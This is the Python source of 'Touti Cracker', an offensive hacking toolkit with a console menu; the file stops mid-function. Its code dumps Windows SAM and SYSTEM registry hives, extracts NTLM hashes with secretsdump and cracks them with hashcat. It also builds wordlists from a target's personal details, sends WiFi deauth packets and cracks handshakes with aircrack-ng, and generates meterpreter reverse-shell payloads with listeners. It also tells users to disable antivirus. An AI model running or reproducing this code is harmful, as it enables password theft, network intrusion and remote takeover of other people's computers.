import platform
import subprocess
import os
import requests
import time
import sys
systemtype = platform.system()
user = os.getlogin()
if systemtype == "Darwin":
    info ="[Info]:"
    print(info + "Installing important dependencies for MacOS...")
    subprocess.run("brew install python", text=True)
    subprocess.run("brew unlink python && brew link python", shell=True, text=True)
    subprocess.run("brew install libffi", shell=True, text=True)
    subprocess.run("brew install openssl", shell=True, text=True)
    subprocess.run("python3 -m venv impacket-env",shell=True, text=True)
    subprocess.run("source impacket-env/bin/activate", shell=True, text=True)
    subprocess.run("python3 -m ensurepip", shell=True, text=True)
    subprocess.run("pip install impacket", shell=True, text=True)
    subprocess.run("pip install requests", shell=True, text=True)       
def check_and_install_dependencies():
    error = "[Error]:"
    info = "[Info]:"
    warning = "[Warning]:"
    user = os.getlogin()
    systemtype = platform.system()


    try:

        print(info + "Checking and installing dependencies...")
        response = requests.get("https://raw.githubusercontent.com/Touti-Sudo/Touti-Cracker/main/requirements.txt")
        with open("requirements.txt", "wb") as file:
            file.write(response.content)


        subprocess.run(["pip", "install", "-r", "requirements.txt"])
        subprocess.run(["pip", "install", "--upgrade", "pip", "setuptools", "wheel"])

        print(info + "Dependencies checked and installed successfully.")
        def aircrackdownload():
                print(info + "Downloading aircrack-ng...")
                aircrack_url = r"https://download.aircrack-ng.org/aircrack-ng-1.7-win.zip"
                aircrack_path = os.path.join("C:\\Users", user, "aircrack")
                if not os.path.exists(aircrack_path):
                    os.makedirs(aircrack_path, exist_ok=True)
                zip_file = os.path.join(aircrack_path, "aircrack-ng.zip")
                response = requests.get(aircrack_url, stream=True)
                if response.status_code == 200:
                    os.makedirs(aircrack_path, exist_ok=True)
                    with open(zip_file, "wb") as file:
                        for chunk in response.iter_content(chunk_size=8192):
                            file.write(chunk)
                    print(info + "Aircrack-ng downloaded successfully.")
                else:
                    print(error + "Failed to download aircrack-ng.")
                    time.sleep(5)

        if systemtype == "Windows":

            
            if not os.path.exists("C:\\Program Files\\7-Zip\\7z.exe"):
                print(error + "7-Zip is not installed. Please install 7-Zip from https://www.7-zip.org/ and try again.")
                time.sleep(5)
                return
            aircrack_zip=rf"C:\Users\{user}\aircrack\aircrack-ng.zip"
            if not os.path.exists(aircrack_zip):
                aircrackdownload()
            aircrack_path = os.path.join("C:\\Users", user, "aircrack")
            extract_path = os.path.join(aircrack_path, "extracted")
            bin_path = os.path.join(extract_path, "aircrack-ng-1.7-win", "bin")
            if not os.path.exists(extract_path):
                os.makedirs(extract_path, exist_ok=True)
            
            if not os.path.exists(bin_path):
                os.makedirs(bin_path, exist_ok=True)
            zip_file = os.path.join(aircrack_path, "aircrack-ng.zip")

            if not os.path.exists(aircrack_path):
                print(info + "Downloading aircrack-ng...")
                aircrackdownload()



            print(info + "Unzipping aircrack-ng...")
            command = fr'"C:\\Program Files\\7-Zip\\7z.exe" x "{zip_file}" -o"{extract_path}" -y'
            result = subprocess.run(command, shell=True,text=True )



            path_to_add = rf"C:\Users\{user}\aircrack\extracted\aircrack-ng-1.7-win\bin"
            command = f'setx PATH "%PATH%;{path_to_add}"'
            
            
            result = subprocess.run(command, shell=True,text=True)
            if result.returncode == 0:
                print(info + "Aircrack-ng path added to system PATH successfully.")
            metasploit_path = os.path.join("C:\\Users", user, "metasploit")
            metasploit_url = "https://windows.metasploit.com/metasploitframework-latest.msi"
            installer_path = os.path.join(metasploit_path, "metasploit.msi")

            if not os.path.exists(metasploit_path):
                print(info + "Downloading Metasploit...")
                print(warning + "The download may take some time depending on your internet connection speed!")

                try:
                    response = requests.get(metasploit_url, stream=True)
                    response.raise_for_status()
                except requests.RequestException as e:
                    print(error + f"Failed to download Metasploit: {e}")
                    time.sleep(5)
                    

                os.makedirs(metasploit_path, exist_ok=True)
                with open(installer_path, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        file.write(chunk)

                print(info + "Metasploit downloaded successfully.")
            else:
                print(info + "Metasploit is already downloaded.")

            metasploit_path2="C:\\Users\\"+user+"\\metasploit-framework"
            print(info + "Launching the Metasploit installer...")
            if not os.path.exists(metasploit_path2):
                try:
                    bin_path2= os.path.join(metasploit_path2, "bin")
                    subprocess.run(["msiexec", "/i", installer_path], check=True)

                except subprocess.CalledProcessError as e:
                    print(error + f"Failed to launch the installer: {e}")
                    time.sleep(5)
                    

        elif systemtype == "Linux":
            subprocess.run("sudo apt-get update", shell=True)
            subprocess.run("sudo apt-get install -y aircrack-ng metasploit-framework", shell=True)
        elif systemtype == "Darwin":
            subprocess.run("brew install aircrack-ng metasploit", shell=True)
        else:
            print(error + "Unsupported system type: " + systemtype)
    except Exception as e:
        print(error + f"Failed to check and install dependencies: {e}")

check_and_install_dependencies()

try:
    import csv
    import secrets
    import pyfiglet
    import signal
    import os
    import requests
    import webbrowser
    import socket
    import time
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from unit.neon_module import neon_text
    console = Console()
    from colorama import init, Fore, Back, Style
    import ctypes
except ImportError as e:
    print(f"Error: {e}. Please install the required modules using:")
    print("pip install -r requirements.txt")
    sys.exit(1)
init()
def get_private_ip():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
       
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1" 
    finally:
        s.close()
    return ip

ip=get_private_ip()

def clearsystem():
    if systemtype =="Windows":
        clear=subprocess.run("cls",text=True,shell=True)
        if clear.returncode!=0:
            subprocess.run("clear",shell=True,text=True)
    else:
        clear=subprocess.run("clear",text=True,shell=True)
        if clear.returncode!=0:
            subprocess.run("cls",shell=True,text=True)
clearsystem()


try:

    info = Fore.BLUE + "[Info]:" + Style.RESET_ALL
    warning = Fore.MAGENTA + "[Warning]:" + Style.RESET_ALL
    disclamer = Fore.YELLOW + "[Disclamer]:" + Style.RESET_ALL
    error = Fore.RED + "[Error]:" + Style.RESET_ALL
    inpute = Fore.GREEN + "[Input]:" + Style.RESET_ALL
    first= Fore.RED + " [1]" + Style.RESET_ALL
    second= Fore.RED + " [2]" + Style.RESET_ALL
    third= Fore.RED + " [3]" + Style.RESET_ALL
    fourth= Fore.RED + " [4]" + Style.RESET_ALL
    fifth= Fore.RED + " [5]" + Style.RESET_ALL
    sixth= Fore.RED + " [6]" + Style.RESET_ALL
    seventh= Fore.RED + " [7]" + Style.RESET_ALL
    eigth= Fore.RED + " [8]" + Style.RESET_ALL
    nine= Fore.YELLOW + " [99]" + Style.RESET_ALL
    def is_admin():
        if systemtype == "Windows":  
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        elif systemtype == "Linux":
            return os.geteuid() == 0
        elif systemtype == "Darwin":
            try:
                return os.getuid() == 0
            except:
                return False

    def is_av_active():
        try:
            
            return os.system("sc query WinDefend | find \"RUNNING\"") == 0
        except:
            return False

    

    def typewriter(text, delay=0.05):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    the_link="https://github.com/Touti-Sudo"
    creator= Fore.RED + " Created by ----> Touti-Sudo : "+ the_link + Style.RESET_ALL
    gui = Fore.LIGHTRED_EX + pyfiglet.figlet_format("Touti Cracker"+" v2.2.1", font="slant") + Style.RESET_ALL
    gui2 = gui+ "                                        " +creator + "\n"
    typewriter(gui2,0.01)
    neon_color = "#FFFF00" 
    texte = "🔥 Welcome to Touti Cracker 🔥\nUse responsibly!"
    console.print(Panel(f"[bold cyan]{texte}[/bold cyan]", 
                        title=f"[bold {neon_color}]Touti Cracker[/bold {neon_color}]", 
                        border_style=f"bold {neon_color}"))
    print("\n")  
     
    infos=info + "Welcome to Touti Cracker This tool will allow you to hack anyone password."
    typewriter(infos,0.01)
    infos= warning+"This is for educationnal purposes only , i am not responsible for any bad and suspicious activities.Thank you for counsidring my words !!"
    typewriter(infos,0.01)
    infos= disclamer+"This is a beta version of Touti Cracker and it may contain bugs or errors, please report them on my github page: " + the_link + " and i will fix them as soon as possible !"
    typewriter(infos,0.01)
    if not is_admin(): # Check if the script is running with admin privileges !
        print("\n" + warning + "Run as Administrator!")
        if systemtype == "Windows":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        elif systemtype == "Linux":
            print(warning + "Please run the script with sudo.")
            sys.exit()
        elif systemtype == "Darwin":
            print(warning + "Please run the script with sudo.")
            sys.exit()
    else:
        print("\n" + info + "You are running as Administrator!")
    
    if is_av_active(): # Check if antivirus is active
        print(warning + "Antivirus may block the Password Cracking process. Temporarily disable it.")
    else:
        print(info + "Antivirus is disabled.")
    print("\n")



    versionpy=platform.python_version()
    printpy=info+"you are running on " + versionpy+"\n"
    if systemtype == "Windows":
        chemin_fichier_de_hashcat = "C:\\Users\\" + user + "\\hashcat"
        hashcatpath = chemin_fichier_de_hashcat + "\\hashcat-6.2.6.7z"
        url = r"https://hashcat.net/files/hashcat-6.2.6.7z"
        if not os.path.exists(hashcatpath):
            print(info+"Downloading Hashcat...")
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)
                with open(hashcatpath, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                            file.write(chunk)
                print(info+"Hashcat downloaded successfully.")
            else:
                print(error+"Failed to download Hashcat.")
                sys.exit()
    elif systemtype == "Linux":
        subprocess.run("sudo apt-get install hashcat", shell=True, text=True)
    def sauvegarder_registres():
        if systemtype == "Windows":
            chemin_backup = "C:\\Users\\"+user+"\\Desktop\\Backup"
        elif systemtype == "Linux":
            chemin_backup = "/home/"+user+"/Desktop/Backup"
        elif systemtype == "Darwin":
            chemin_backup = "/Users/"+user+"/Desktop/Backup"
        registres=input(inpute+'You want to save YOUR regestry keys ? (y/n) "if you have the target regestry keys then put them in ' + chemin_backup + '"' + ' :')


        if registres.lower() == "y":
            if systemtype == "Windows":
                print(info+"Saving Registry keys...")
                chemin_system_save = os.path.join(chemin_backup, "system.save")
                chemin_sam_save = os.path.join(chemin_backup, "sam.save")

    
                os.makedirs(chemin_backup, exist_ok=True)

    
                if os.path.exists(chemin_system_save) and os.path.exists(chemin_sam_save):
                    print(info+"Registry keys already saved. Skipping registry saving...")
                    return


                commande_system = f'reg save HKLM\\system "{chemin_system_save}"'
                commande_sam = f'reg save HKLM\\sam "{chemin_sam_save}"'

                result_system = subprocess.run(commande_system, shell=True, capture_output=True, text=True)
                if result_system.returncode == 0:
                    print(info+"System registry key saved successfully.")
                else:
                    print(error+f"{result_system.stderr}\nError saving system registry key , high privilege may be required so please restart Touti Cracker at admin mod")
                    exit()

                result_sam = subprocess.run(commande_sam, shell=True, capture_output=True, text=True)
                if result_sam.returncode == 0:
                    print(info+"SAM registry key saved successfully.")
                else:
                    print(error+f"{result_sam.stderr}\nError saving SAM registry key , high privilege may be required so please restart Touti Cracker at admin mod")
                    exit()
            else:

                print(error+"The feature of saving registers is not available for Linux and Mac yet but it will be in the next update and you can still put target registers in (/Desktop/Backup) check my github account for more details: " + the_link)
        elif registres.lower() == "n":
            pass
        else:
            print(error+"Please provide a correct value (y/n)")
            
    def cracker():
        request = input(inpute+"Do you want to crack a password using the last saved wordlist? (y/n): ").strip().lower()

        if request == "y":
            if systemtype == "Windows":
                chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\passwordlist.txt"
            if systemtype == "Linux":
                chemin_fichier = "/home/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
            if systemtype == "Darwin":
                chemin_fichier = "/Users/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
            def remove_spaces(text):
                return text.replace(" ", "")
            systemtype_no_spaces = remove_spaces(systemtype)

            if systemtype_no_spaces == "Windows":
                chemin_extraction = chemin_fichier_de_hashcat + "\\extracted"
                os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)

                if not os.path.exists(chemin_extraction):
                    os.makedirs(chemin_extraction, exist_ok=True)
                    if systemtype == "Windows":
                        command = f'"C:\\Program Files\\7-Zip\\7z.exe" x "{hashcatpath}" -o"{chemin_extraction}" -y'
                        print(info+"Unzipping Hashcat...")
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        if result.returncode == 0:
                            print(info+"Hashcat unzipped successfully.")
                        else:
                            print(error+f"Error unzipping Hashcat: {result.stderr}")
                            print (warning+"you may need to verify that you have 7-zip installed")
                            return

                sauvegarder_registres()


                print(info+"Extracting hashes from system and SAM files...")
                
                command_for_extracth = (
                    f'python C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\{versionpy}\\Scripts\\secretsdump.py '
                    f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
                    f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
                    )

                
                resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
                print(info+"These are the results:\n" + resultextract.stdout)
                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
                    print(error+"\n=== Secretsdump Errors ===")
                    print(resultextract.stderr)

                yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
                
                chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
                os.chdir(os.path.dirname(chemin_extraction2)) 
                print(info+"Launching Hashcat...")

                command_lunch_hashcat = f'"{chemin_extraction2}" -O -m 1000 "{yourhash}" "{chemin_fichier}"'
                command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
                print(command_lunch_hashcats.stdout)
                if command_lunch_hashcats.stderr:
                    print(error+"\n=== Hashcat Errors ===")
                    print(command_lunch_hashcats.stderr)

            elif systemtype == "Linux":
                print(disclamer+"You need to have the system.save and sam.save files in the /home/"+user+"/Desktop/Backup directory to extract hashes from them.")
                command_for_extracth = (
                        f'impacket-secretsdump '
                        f'-sam /home/{user}/Desktop/Backup/sam.save '
                        f'-system /home/{user}/Desktop/Backup/system.save LOCAL'
                )
                resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
                print(info+"These are the results:\n" + resultextract.stdout)
                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
                    print(error+"\n=== Secretsdump Errors ===")
                    print(resultextract.stderr)

                yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
                command_lunch_hashcat = f'hashcat -O -m 1000 "{yourhash}" "{chemin_fichier}"'
                command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
                print(command_lunch_hashcats.stdout)

                if command_lunch_hashcats.stderr:
                    print(error+"\n=== Hashcat Errors ===")
                    print(command_lunch_hashcats.stderr)

            elif systemtype == "Darwin":
                print(disclamer+"You need to have the system.save and sam.save files in the /home/"+user+"/Desktop/Backup directory to extract hashes from them.")
                command_for_extracth = (
                        f'impacket-secretsdump '
                        f'-sam /Users/{user}/Desktop/Backup/sam.save '
                        f'-system /Users/{user}/Desktop/Backup/system.save LOCAL'
                )
                resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
                print(info+"These are the results:\n" + resultextract.stdout)
                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
                    print(error+"\n=== Secretsdump Errors ===")
                    print(resultextract.stderr)

                yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
                command_lunch_hashcat = f'hashcat -O -m 1000 "{yourhash}" "{chemin_fichier}"'
                command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
                print(command_lunch_hashcats.stdout)
                if command_lunch_hashcats.stderr:
                    print(error+"\n=== Hashcat Errors ===")
                    print(command_lunch_hashcats.stderr)
                    print(warning+"You may need to check the system.save and sam.save files in the /Users/"+user+"/Desktop/Backup directory to extract hashes from them.")
                    exit()
            command_lunch_hashcat = f'"{chemin_extraction2}" -O -m 1000 "{yourhash}" "{chemin_fichier}"'
            command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
            print(command_lunch_hashcats.stdout)

            if command_lunch_hashcats.stderr:
                print(error+"\n=== Hashcat Errors ===")
                print(command_lunch_hashcats.stderr)


        elif request == "n":   
            request=input(inpute+"Do you want to regenerate a new password list (y/n):").strip().lower() 
            if request=="y":
                generer_mots_de_passe()
            elif request=="n":
                return
            else:
                print("Please provide a correct value (y/n)")        
        else:
            print(error+"Please provide a correct value (y/n)")
            
    def generer_mots_de_passe():
        print(info+first+" Customyze")
        print(info+second+" Randomyze")
        choice = input(inpute+"Please choose an option: ")
        if choice == "1":
            print(info+"customizing password generator...")
            if systemtype == "Windows":
                chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\passwordlist.txt"
            if systemtype == "Linux":
                chemin_fichier = "/home/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
            if systemtype == "Darwin":
                chemin_fichier = "/Users/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
            number_of_generated_words = int(input(inpute+"How many passwords do you want to generate for brute force? : "))
            informations = []

            print(inpute+"Provide information to generate passwords (Press Enter to skip ):")
            Name = input(inpute+"First Name: ") or ""
            Family = input(inpute+"Family Name: ") or ""
            Nick = input(inpute+"Nick Name: ") or ""
            birth = input(inpute+"Date of birth (DD/MM/YYYY): ") or ""
            pet = input(inpute+"Pet Name: ") or ""
            country = input(inpute+"Country: ") or ""
            city = input(inpute+"City: ") or ""

            informations.extend([Name, Family, Nick, birth, pet, country, city])
            informations = [info for info in informations if info]  

            os.makedirs(os.path.dirname(chemin_fichier), exist_ok=True)

            with open(chemin_fichier, "w", encoding="utf-8") as fichier:
                print(info+"Generated Passwords:")
                for i in range(number_of_generated_words):
                    longeur = secrets.choice(range(3, 16))
                    mot_de_passe = ''.join(secrets.choice(informations) for _ in range(longeur))
                    mot_de_passee =f"{i + 1}.{mot_de_passe}"
                    mot_de_passee=mot_de_passee.split(".", 1)[-1].strip()
                    print(mot_de_passee)
                    fichier.write(mot_de_passee +"\n")
        elif choice == "2": 
            if systemtype == "Windows":
                chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\passwordlist.txt"
            elif systemtype == "Linux":
                chemin_fichier = "/home/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
            elif systemtype == "Darwin":
                chemin_fichier = "/Users/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
            chifrre = "0123456789"
            lettre = "azertyuiopmlkjhgfdsqwxcvbn"
            lettreup = lettre.upper()
            caractere_special = "}@()é&à=+-*/ç_²$ù^!;,"
            number_of_generated_words = int(input(inpute+"How many passwords do you want to generate for brute force? : "))
            liste_complete = list(lettre + chifrre + lettreup + caractere_special)
            dossier = os.path.dirname(chemin_fichier)
            if not os.path.exists(dossier):
                os.makedirs(dossier)

            with open(chemin_fichier, "w", encoding="utf-8") as fichier:
                print(info+"Generated Passwords:")
                for i in range(number_of_generated_words):
                    longeur =secrets.choice(range(3, 17)) 
                    mot_de_passe = ''.join(secrets.choice(liste_complete,) for _ in range(longeur))
                    mot_de_passee = f"{i + 1}. {mot_de_passe}"
                    mot_de_passee=mot_de_passee.split(".",1)[-1].strip()
                    print(mot_de_passee)
                    fichier.write(mot_de_passee + "\n")
        else:
            print(error+"Please enter a valid choice (1/2).")
            return
        print(info+f"All passwords have been saved to: {chemin_fichier}")
        

    def automated_wifi_attack():

        interface = "wlan0"

        print("🔁 Enabling monitor mode...")
        subprocess.run(f"airmon-ng start {interface}", shell=True)
        if systemtype == "Linux":
            output_base = "/home/" + user + "/Desktop/captures/scan"
        if systemtype == "Darwin":
            output_base = "/Users/" + user + "/Desktop/captures/scan"
        os.makedirs(os.path.dirname(output_base), exist_ok=True)
        extensions = [".csv", ".cap", ".netxml", ".kismet.csv", ".kismet.netxml"]

        
        for ext in extensions:
            path = f"{output_base}-01{ext}"
            if os.path.exists(path):
                os.remove(path)

        print("📡 Scanning nearby networks for 15 seconds...")
        scan = subprocess.Popen(
            f"airodump-ng {interface} -w{output_base} --output-format csv",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(15)
        os.killpg(os.getpgid(scan.pid), signal.SIGINT)        
        scan.wait()
        print("✅ Scan complete. Check 'scan-01.csv' for BSSID and Channel.")
        with open("/home/" + user + "/Desktop/captures/scan-01.csv", newline='', encoding="utf-8") as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                print(" | ".join(row))
        target = input("📥 Enter the target BSSID and channel (comma-separated, e.g. 12:34:56:78:90:AB,6): ").strip().split(",")
        if len(target) != 2:
            print("❌ Invalid input.")
            return

        BSSID, Channel = target
        print(f"🎯 Target: BSSID={BSSID}, Channel={Channel}")

        print("🛰️  Starting airodump-ng for 15 seconds...")
        airodump = subprocess.Popen(
            f"airodump-ng -c {Channel} --bssid {BSSID} -w capture {interface}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(15)
        airodump.terminate()
        os.killpg(os.getpgid(airodump.pid), signal.SIGINT)
        airodump.wait()
        print("✅ Capture complete. Check 'capture-01.cap' for captured packets.")
        client = input("📥 Enter the target client MAC address: ").strip()

        print("⚡ Sending deauth packets...")
        subprocess.run(
            f"aireplay-ng --deauth 10 -a {BSSID} -c {client} {interface}",
            shell=True
        )

        choice = input("❓ Do you have a wordlist? (y/n): ").strip().lower()
        if choice == "y":
            wordlist_path = input("📂 Enter the path to your wordlist: ").strip()
        else:
            print("⚙️ Generating a default wordlist...")
            generer_mots_de_passe()
            if systemtype == "Windows":
                wordlist_path = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\passwordlist.txt"
            if systemtype == "Linux":
                wordlist_path = "/home/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
            if systemtype == "Darwin":
                wordlist_path = "/Users/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"

        print("🔓 Launching aircrack-ng...")
        subprocess.run(
            f"aircrack-ng -b {BSSID} -w {wordlist_path} capture-01.cap",
            shell=True
        )


    while True:
            neon_shades = ["#00FFFF", "#00DDFF", "#00BBFF", "#0099FF", "#0077FF", "#0055FF"]
                    
            menu_text = [
                "[1] Password Generator",
                "[2] Brute Force",
                "[3] Steal Local Target Registers",
                "[4] Crack a Wifi Password",
                "[5] Reverse Shell Payload",
                "[6] launch msfconsole",
                "[7] View Github Page",
                "[8] View README.txt",
                "[9] View License",
                "[99] Exit"
            ]
            styled_text = Text()
            for i, line in enumerate(menu_text):
                color = neon_shades[i % len(neon_shades)]  
                styled_text.append(line, style=f"bold {color}")
                styled_text.append("\n")  


            console.print(Panel(styled_text, title="🔹 Menu 🔹", border_style="cyan"))




            choice= input(inpute+"Please choose an option:")
            if choice == "99":
                print(info+"Exiting...")
                clearsystem()
                neon_text("Good Bye", duration=3)
                print("Thank's for using Touti-Sudo's Software")
                break
            elif choice == "2":
                cracker()

            elif choice == "1":
                generer_mots_de_passe()

            elif choice == "7":
                webbrowser.open(the_link)

            elif choice == "8":
                print(info+"Opening README.txt...")
                the_link2 = "https://github.com/Touti-Sudo/Touti-Cracker/blob/main/README.md"
                webbrowser.open(the_link2)

            elif choice == "3":
                sauvegarder_registres()
                print(info+"You can now bruteforce the password using the saved registers")
            elif choice == "6":
                if systemtype == "Windows":
                    print(info+"Launching msfconsole...")
                    chemin_msfconsole = "C:\\Users\\" + user + "\\metasploit-framework\\bin\\msfconsole.bat"
                    subprocess.run(chemin_msfconsole, shell=True, text=True)
                elif systemtype == "Linux":
                    print(info+"Launching msfconsole...")
                    subprocess.run("msfconsole", shell=True, text=True)
                elif systemtype == "Darwin":
                    print(info+"Launching msfconsole...")
                    subprocess.run("msfconsole", shell=True, text=True)
            
            elif choice == "4":
                if systemtype == "Windows":
                    print(info+"The cracking processe on Windows is limited to the GUI version of aircrack-ng due to the lack of support for the CLI version on Windows.")
                    time.sleep(10)
                    subprocess.run('"Aircrack-ng GUI.exe"', shell=True, text=True)
                elif systemtype == "Linux" or systemtype == "Darwin":
                        print(info+first+" Automatically")
                        print(info+second+" Manually(Creates a Terminal Window where you can lunch aircrack-ng commands)")
                        choice = input(inpute+"Please choose an option: ")
                        if choice == "1":
                            automated_wifi_attack()
                        elif choice == "2":
                            subprocess.run("bash  -c 'aircrack-ng; exec bash'", shell=True, text=True)
                        else:
                            print(error+"Please enter a valid choice (1/2).")
            elif choice == "9":
                webbrowser.open("https://github.com/Touti-Sudo/Touti-Cracker/blob/main/LICENSE.txt")
            elif choice == "5":
                attacktype=input(info+first+"Local reverse shell(Privet ip use)\n"+info+second+"Public reverse shell(Public ip use)\n"+inpute+"Please choose an option(1/2): ").strip().lower()
                if attacktype=="1":
                    platformattack=input(inpute+"Choose the platform to attack (Windows/Linux): ").strip().lower()
                    payloadname=input(inpute+"Please enter a name for your payload (with extension): ").strip()
                    extension = payloadname.split('.')[-1].lower()
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    payloadname = os.path.join(script_dir, payloadname)  # Save payload in the current directory
                    port= input(inpute+"Please enter the port to use (default is 4444): ").strip() or "4444"
                    msfvenom="C:\\Users\\"+user+"\\metasploit-framework\\bin\\msfvenom.bat"
                    msfconsole="C:\\Users\\"+user+"\\metasploit-framework\\bin\\msfconsole.bat"

                    if systemtype == "Windows":
                        if platformattack == "windows":
                            print("Creating Payload...")
                            command=msfvenom+" -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        elif platformattack == "linux":
                            print("Creating Payload...")
                            command=msfvenom+" -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                    elif systemtype == "Linux":
                        if platformattack == "windows":
                            print("Creating Payload...")
                            command="msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        elif platformattack == "linux":
                            print("Creating Payload...")
                            command="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        else:
                            print(error+"MacOS and Android are not supported yet but it will be in the next update. StayTuned: " + the_link)    
                    else :
                        print(error + "MacOS and Android are not supported yet but it will be in the next update and much more !. StayTuned: " + the_link)
                elif attacktype=="2":
                    platformattack=input(inpute+"Choose the platform to attack (Windows/Linux): ").strip().lower()
                    def get_public_ip():
                        try:
                            response = requests.get("https://ipinfo.io/json")
                            data = response.json()
                            return data.get("ip", "IP not found")
                        except Exception as e:
                            return f"Error: {e}"
                    ip = get_public_ip()
                    payloadname=input(inpute+"Please enter a name for your payload (with extension): ").strip()
                    extension = payloadname.split('.')[-1].lower()
                    port= input(inpute+"Please enter the port to use (default is 4444): ").strip() or "4444"
                    print(info+"Your public IP is: " + ip)
                    print(warning+"Make sure to port forward your router to receive the connection from the target (This port "+port+").\n"+warning+"Port forwarding and opening ports or exposing services like SSH or Metasploit payload listeners to the public internet can make your system highly vulnerable !\n"+warning+"Use this feature at your own risk and only if you know what you are doing !\n"+warning+"If you are not sure about port forwarding, please use the local reverse shell option instead.")
                    if systemtype == "Windows":
                        msfvenom="C:\\Users\\"+user+"\\metasploit-framework\\bin\\msfvenom.bat"
                        msfconsole="C:\\Users\\"+user+"\\metasploit-framework\\bin\\msfconsole.bat"
                        if platformattack == "windows":
                            print("Creating Payload...")
                            command= msfvenom+" -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        elif platformattack == "linux":
                            print("Creating Payload...")
                            command=msfvenom+" -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                    elif systemtype == "Linux":
                        if platformattack == "windows":
                            print("Creating Payload...")
                            command="msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                            subprocess.run(command, shell=True, text=True)
                            print(info+"Creating a Tcp listener...")
                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                        elif platformattack == "linux":
                            print("Creating Payload...")
                            command="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
